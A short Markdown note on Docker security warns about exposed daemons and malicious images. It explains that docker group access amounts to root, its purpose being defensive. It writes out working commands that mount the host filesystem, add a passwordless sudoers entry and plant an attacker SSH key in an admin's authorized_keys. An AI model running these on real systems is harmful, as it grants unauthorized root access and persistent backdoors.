Docker Security Notes
=====================


Secure Your Server and Be Careful of Malicious Images
-----------------------------------------------------

There are automated bots that scan for Docker daemons to exploit; if
you leave a port open you will get 0wned. (See 'Leveraging Docker for
Root Access' below.) The default standalone config uses only a Unix
socket, but management systems may open stuff further.

Malicious images are also a problem, and, despite Docker doing
security scanning, may be left up on [Docker Hub] for a year or more.

For details, see:
* [Cryptojacking invades cloud. How modern containerization trend is
  exploited by attackers][kromtech]


Leveraging Docker for Root Access
---------------------------------

On most systems there is a `docker` group with access to the Docker
daemon socket. Anybody in this group should also be explictly allowed
to sudo to a root shell. If they can't, they can leverage their
implict access via:

    #   On the host, start a Docker container with a root shell
    #   that has access to all files on the host.
    docker run -it --rm --name root -v /:/host:rw alpine /bin/sh -l

    #   You are now running as root user in the docker container.
    #   Allow user `taro` to sudo to a root shell with no password.
    cd /host/etc/sudoers.d
    echo 'taro ALL=(ALL) NOPASSWD:ALL' > 50-taro
    chmod 600 50-taro
    exit

    #   Or, more subtly, if another user has sudo without password:
    cat >> /host/home/adminuser/.ssh/authorized_keys
    ssh-rsa AAAA.... ur@hacked.com
    ^D



[Docker Hub]: https://hub.docker.com/explore/
[kromtech]: https://kromtech.com/blog/security-center/cryptojacking-invades-cloud-how-modern-containerization-trend-is-exploited-by-attackers
